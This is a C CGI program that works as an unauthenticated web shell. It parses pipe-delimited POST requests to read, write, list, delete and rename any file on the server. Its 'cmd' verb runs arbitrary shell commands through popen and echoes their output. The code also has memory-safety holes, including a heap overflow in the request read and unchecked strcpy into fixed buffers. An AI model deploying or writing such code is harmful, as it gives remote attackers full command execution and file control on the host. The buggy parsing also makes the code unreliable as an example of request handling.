#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <time.h>
#include <linux/limits.h>

const char *delim = "|";

void ReadFile(unsigned char *filePath)
{
    struct stat st;
    int exist = stat(filePath, &st);

    if (exist == 0)
    {
        int size = st.st_size;
        unsigned char *buff = malloc(size);
        FILE *fp = fopen(filePath, "r");
        if (fp)
        {
            fread(buff, size, 1, fp);

            for (int i = 0; i < size; ++i)
            {
                printf("%c", buff[i]);
            }
            fclose(fp);
        }
        free(buff);
    }
}

void WriteFile(unsigned char *filePath, unsigned char *Content, int len)
{
    printf("\n-------WriteFile--------\n");
    for(int i=0;i<len;++i){
        printf("%02x ",Content[i]);
    }
    FILE *fp = fopen(filePath, "w");

    fwrite(Content, len, 1, fp);

    // fputs(Content, fp);
    fclose(fp);
}

void GetFileInfo(unsigned char *filePath)
{
    struct stat st;
    int exist = stat(filePath, &st);

    if (exist == 0)
    {
        printf("%d", S_ISDIR(st.st_mode));
        printf("%s", delim);
        printf("%d", S_ISREG(st.st_mode));
        printf("%s", delim);
        printf("%s", ctime(&st.st_mtime));
    }
}

void ListFilesName(const unsigned char *folderpath, unsigned char *output)
{
    struct stat st;
    int exist = stat(folderpath, &st);

    if (exist == 0)
    {
        DIR *d;
        struct dirent *dir;
        d = opendir(folderpath);
        if (d)
        {
            while ((dir = readdir(d)) != NULL)
            {
                printf("%s\n", dir->d_name);
            }
            closedir(d);
        }
    }
}

void DeleteFile(unsigned char *filePath)
{
    remove(filePath);
}

void RenameFile(unsigned char *filePath, unsigned char *newName)
{
    rename(filePath, newName);
}

void GetAbsPath(unsigned char *filePath)
{
    unsigned char abs_path[PATH_MAX];
    realpath(filePath, abs_path);
    printf("%s", abs_path);
}

void ExecCmd(unsigned char *cmd)
{
    FILE *fp;
    char path[1035];

    /* Open the command for reading. */
    fp = popen(cmd, "r");
    if (fp == NULL){
        printf("Failed to run command\n");
        return;
    }

    while (fgets(path, sizeof(path), fp) != NULL){
        printf("%s", path);
    }

    pclose(fp);
}

void ListAllFilesInfoUnderPath(unsigned char *folderpath){
    struct stat st;
    int exist = stat(folderpath, &st);

    if (exist == 0)
    {
        DIR *d;
        struct dirent *dir;
        d = opendir(folderpath);
        if (d)
        {
            unsigned char fullfilePath[PATH_MAX] = {0};
            while ((dir = readdir(d)) != NULL)
            {
                printf("%s", dir->d_name);
                printf("%s", delim);
                strcpy(fullfilePath,folderpath);
                strcat(fullfilePath,dir->d_name);
                GetFileInfo(fullfilePath);
            }
            closedir(d);
        }
    }
}

int main()
{
    printf("Content-Type: text/plain\n\n");

    unsigned char *str_len_ = getenv("CONTENT_LENGTH");
    int halfbytelen = strtol(str_len_, NULL, 10);
    int len = halfbytelen / 2;

    unsigned char *halfbytequery = malloc(halfbytelen + 1);
    unsigned char *query = malloc(len + 1);

    if (!halfbytequery || !query)
    {
        exit(EXIT_FAILURE);
    }


printf("\n=============>%d\n",halfbytelen);
    fread(query, halfbytelen, 1, stdin);

    // for(int i=0;i<halfbytelen;++i){
    //     printf("%02x ",query[i]);
    // }

    // unsigned char tmp = 0;
    // for (int i = 0; i < len; ++i)
    // {
    //     tmp = 0;

    //     tmp = tmp | halfbytequery[i * 2];
    //     tmp = tmp << 4;
    //     tmp = tmp | halfbytequery[i * 2 + 1];

    //     query[i] = tmp;
    //     // printf("%02x ",tmp);
    // }

    query[halfbytelen] = 0;

    for (int i = 0; i < halfbytelen; ++i)
    {
        printf("%c",query[i]);
    }


    // printf("\n%d\n", len);

    if (strlen(query) != 0)
    {
        unsigned char *token = strtok(query, delim);
        if (token)
        {
            if (strcmp("read", token) == 0)
            {
                token = strtok(NULL, delim);
                if (token)
                {
                    ReadFile(token);
                }
            }
            else if (strcmp("write", token) == 0)
            {
                unsigned char filePath[PATH_MAX] = {0};
                token = strtok(NULL, delim);
                strcpy(filePath, token);
                token = strtok(NULL, delim);
                WriteFile(filePath, token, halfbytelen - strlen("write|") - strlen(filePath) - strlen("|"));
            }
            else if (strcmp("list", token) == 0)
            {
                unsigned char folderPath[100] = {0};
                token = strtok(NULL, delim);
                strcpy(folderPath, token);
                token = strtok(NULL, delim);
                ListFilesName(folderPath, token);
            }
            else if (strcmp("info", token) == 0)
            {
                token = strtok(NULL, delim);
                if (token)
                {
                    GetFileInfo(token);
                }
            }
            else if (strcmp("delete", token) == 0)
            {
                token = strtok(NULL, delim);
                if (token)
                {
                    DeleteFile(token);
                }
            }
            else if (strcmp("rename", token) == 0)
            {
                unsigned char filePath[PATH_MAX] = {0};
                token = strtok(NULL, delim);
                strcpy(filePath, token);
                token = strtok(NULL, delim);
                RenameFile(filePath, token);
            }
            else if (strcmp("path", token) == 0)
            {
                token = strtok(NULL, delim);
                if (token)
                {
                    GetAbsPath(token);
                }
            }
            else if (strcmp("cmd", token) == 0)
            {
                token = strtok(NULL, delim);
                if (token)
                {
                    ExecCmd(token);
                }
            }
            else if (strcmp("listall", token) == 0)
            {
                token = strtok(NULL, delim);
                if (token)
                {
                    ListAllFilesInfoUnderPath(token);
                }
            }
        }
    }

    free(halfbytequery);
    free(query);
}
